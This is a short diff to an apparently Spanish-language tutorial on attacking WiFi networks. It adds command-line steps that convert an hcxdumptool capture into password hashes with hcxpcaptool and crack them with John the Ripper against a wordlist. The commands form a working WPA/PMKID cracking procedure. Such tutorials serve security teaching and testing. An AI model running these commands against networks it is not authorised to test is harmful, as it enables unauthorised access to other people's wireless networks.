@@ -234,6 +234,14 @@ Con este ataque aunque la red no tenga clientes nos esta pillando el hash.
 
 ```
 > hcxdumptool -i {tarjeta de red} -o Captura --enable_status=1
+
+> hcxpcaptool -z myHashes Captura
+
+#ahora vamos a ver los hashes
+> cat myHashes
+
+#ya solo falta crackear los hashes
+> john --wordlist={diccionario.txt} myHashes
 ```
 
 
